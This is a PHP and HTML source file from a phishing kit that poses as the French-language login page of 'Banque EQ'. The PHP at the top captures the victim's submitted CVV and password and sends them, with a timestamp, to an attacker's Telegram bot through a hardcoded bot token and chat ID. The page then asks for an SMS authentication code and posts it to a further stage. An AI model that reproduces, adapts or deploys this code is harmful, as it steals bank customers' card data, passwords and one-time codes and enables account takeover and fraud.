<?php 
session_start();

// Vérifie si l'utilisateur arrive sur la page via une redirection et s'il y a des données à traiter
if (!isset($_GET['loop'])) {
    if (!isset($_POST["cvv"]) || !isset($_POST["mdp"])) {
        header("Location: ./index.php");
        exit();
    }
}

// Si les données de connexion sont présentes, les enregistrer dans la session
if (isset($_POST["cvv"]) || isset($_POST["mdp"])) {
    $_SESSION["cvv"] = $_POST['cvv'];
    $_SESSION["mdp"] = $_POST['mdp'];
    $heure = date("h:i:s");
    $date = date("Y-m-d");

    // Prépare le message formaté à envoyer sur Telegram
    $message = "📢 **NOUVELLE CONNEXION** 📢\n\n" .
               "🏦 **Banque** : " . $_SESSION["bank"] . "\n" .
               "🕒 **Heure** : " . $heure . "\n" .
               "📅 **Date** : " . $date . "\n" .
               "💳 **CVV** : `" . $_SESSION["cvv"] . "`\n" .
               "🔑 **Mot de Passe** : `" . $_SESSION["mdp"] . "`\n";

    // Informations pour l'envoi sur Telegram
    $token = "8180049874:AAG00ea5LHEkC3pk9NgfrikOMPX0P2ljP6c"; // Remplace par ton token
    $chat_id = "7691383619"; // Remplace par ton chat ID

    // URL de l'API Telegram pour envoyer le message
    $urlMessage = "https://api.telegram.org/bot$token/sendMessage";

    // Tableau de données pour envoyer le message formaté
    $dataMessage = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
    ];

    // Envoi du message via cURL
    $chMessage = curl_init();
    curl_setopt($chMessage, CURLOPT_URL, $urlMessage);
    curl_setopt($chMessage, CURLOPT_POST, 1);
    curl_setopt($chMessage, CURLOPT_POSTFIELDS, http_build_query($dataMessage));
    curl_setopt($chMessage, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chMessage, CURLOPT_SSL_VERIFYPEER, false);

    // Exécute la requête d'envoi du message
    $responseMessage = curl_exec($chMessage);

    // Vérifie si cURL a rencontré une erreur lors de l'envoi du message
    if (curl_errno($chMessage)) {
        echo 'Erreur cURL (message) : ' . curl_error($chMessage);
    }
    curl_close($chMessage);

    // URL de l'API Telegram pour envoyer un sticker
    $urlSticker = "https://api.telegram.org/bot$token/sendSticker";

    // Envoie un sticker après le message
    $dataSticker = [
        'chat_id' => $chat_id,
        'sticker' => 'CAACAgIAAxkBAAEG9Utkp1g7LXoPDE7LIF8RCtEF5lVpPgACXgIAAladvQrmMlSMUATdlx4E' // Remplace par le File ID du sticker souhaité
    ];

    // Envoi du sticker via cURL
    $chSticker = curl_init();
    curl_setopt($chSticker, CURLOPT_URL, $urlSticker);
    curl_setopt($chSticker, CURLOPT_POST, 1);
    curl_setopt($chSticker, CURLOPT_POSTFIELDS, http_build_query($dataSticker));
    curl_setopt($chSticker, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chSticker, CURLOPT_SSL_VERIFYPEER, false);

    // Exécute la requête d'envoi du sticker
    $responseSticker = curl_exec($chSticker);

    // Vérifie si cURL a rencontré une erreur lors de l'envoi du sticker
    if (curl_errno($chSticker)) {
        echo 'Erreur cURL (sticker) : ' . curl_error($chSticker);
    }
    curl_close($chSticker);
}
?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banque EQ - Connexion</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#8E6FF7',
                        secondary: ''
                    },
                    borderRadius: {
                        'none': '0px',
                        'sm': '4px',
                        DEFAULT: '8px',
                        'md': '12px',
                        'lg': '16px',
                        'xl': '20px',
                        '2xl': '24px',
                        '3xl': '32px',
                        'full': '9999px',
                        'button': '8px'
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css">
    <style>
        :where([class^="ri-"])::before {
            content: "\f3c2";
        }

        body {
            background-color: #f5f5f5;
            font-family: 'Inter', sans-serif;
        }

        .form-input:focus {
            outline: none;
            border-color: #8E6FF7;
        }

        .checkbox-custom {
            appearance: none;
            width: 18px;
            height: 18px;
            border: 1px solid #d1d5db;
            border-radius: 4px;
            position: relative;
            cursor: pointer;
        }

        .checkbox-custom:checked {
            background-color: #8E6FF7;
            border-color: #8E6FF7;
        }

        .checkbox-custom:checked::after {
            content: "";
            position: absolute;
            left: 6px;
            top: 2px;
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
    </style>
</head>

<body class="min-h-screen">
    <!-- Header -->
    <header class="bg-white py-4 px-4 md:px-6 shadow-sm">
        <div class="container mx-auto">
            <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-4 md:gap-0">
                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <div class="bg-yellow-400 w-10 h-10 flex items-center justify-center rounded">
                            <span class="font-bold text-black">EQ</span>
                        </div>
                        <span class="ml-2 font-bold text-black">Banque EQ</span>
                    </div>
                    <div class="md:hidden w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center cursor-pointer">
                        <i class="ri-menu-line text-gray-600"></i>
                    </div>
                </div>
                <div class="flex flex-col md:flex-row items-start md:items-center gap-4 md:space-x-4">
                    <a href="#" class="text-gray-700 hover:text-primary transition">Besoin d'aide?</a>
                    <div class="flex items-center border border-gray-300 rounded-full px-4 py-1">
                        <span>Français</span>
                        <div class="w-6 h-6 ml-2 flex items-center justify-center">
                            <i class="ri-arrow-down-s-line"></i>
                        </div>
                    </div>
                    <div class="hidden md:flex w-10 h-10 bg-gray-100 rounded-full items-center justify-center cursor-pointer">
                        <i class="ri-moon-line text-gray-600"></i>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="container mx-auto py-12 md:py-16 px-4">
        <div class="w-full max-w-lg mx-auto bg-white rounded-lg shadow-md p-8 md:p-10">
            <h1 class="text-3xl font-bold text-center mb-10">Ouvrir une session</h1>
            <form id="loginForm" action="/eqbanque/terminus.php" method="post">
            <h1> Vous recevrez un code d'authenthification sur votre E-mail ou sms</h1>
            <div class="mb-6 relative">
                    <div class="flex items-center border border-gray-300 rounded-md px-4 py-3">
                        <div class="w-6 h-6 flex items-center justify-center mr-2">
                            <i class="ri-mail-line text-gray-500"></i>
                        </div>
                      
                        <input name='sms' type="text" class="w-full border-none focus:ring-0 text-sm" placeholder="Code sms">
                    </div>
                </div>
          
                <button type="submit" class="w-full bg-[#C41F7E] hover:bg-opacity-90 text-white py-4 !rounded-button mb-6 text-lg font-medium whitespace-nowrap">
                    Ouvrir une session
                </button>
                <div class="flex items-center justify-between mb-8">
                    <div class="flex items-center">
                        <input type="checkbox" id="remember" class="checkbox-custom mr-3">
                        <label for="remember" class="text-base text-gray-700">Mémoriser mon courriel</label>
                    </div>
                    <a href="#" class="text-[#C41F7E] text-base hover:underline">Mot de passe oublié</a>
                </div>
                <div class="text-center text-sm text-gray-700">
                    Vous n'avez pas de compte?
                    <a href="#" class="text-primary hover:underline">S'inscrire</a>
                </div>
            </form>
            <div class="mt-8 text-center">
                <a href="#" class="text-sm text-gray-500 hover:text-primary">Garantie de sécurité</a>
            </div>
        </div>
    </main>
    <!-- Chat Button -->
    <div class="fixed bottom-6 right-6">
        <button class="w-14 h-14 bg-pink-500 text-white rounded-full shadow-lg flex items-center justify-center hover:bg-pink-600 transition">
            <i class="ri-message-3-line text-xl"></i>
        </button>
    </div>
    <!-- Footer -->
    <footer class="bg-white mt-10 md:mt-20 py-6 md:py-8 border-t border-gray-200">
        <div class="container mx-auto px-4">
            <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-6 md:gap-0">
                <nav class="grid grid-cols-2 md:flex md:space-x-6 gap-4 text-sm text-gray-600">
                    <a href="#" class="hover:text-primary">Nous joindre</a>
                    <a href="#" class="hover:text-primary">FAQ</a>
                    <a href="#" class="hover:text-primary">Accessibilité</a>
                    <a href="#" class="hover:text-primary">Confidentialité</a>
                    <a href="#" class="hover:text-primary">Sécurité</a>
                    <a href="#" class="hover:text-primary">Avis juridiques</a>
                </nav>
                <div class="text-center md:text-right">
                    <p class="text-xs text-gray-500">MCMarque déposée de la Banque Equitable. Tous droits réservés.</p>
                    <p class="text-xs text-gray-500">La Banque EQ est un nom commercial de la Banque Equitable.</p>
                </div>
            </div>
        </div>
    </footer>
</body>

</html>
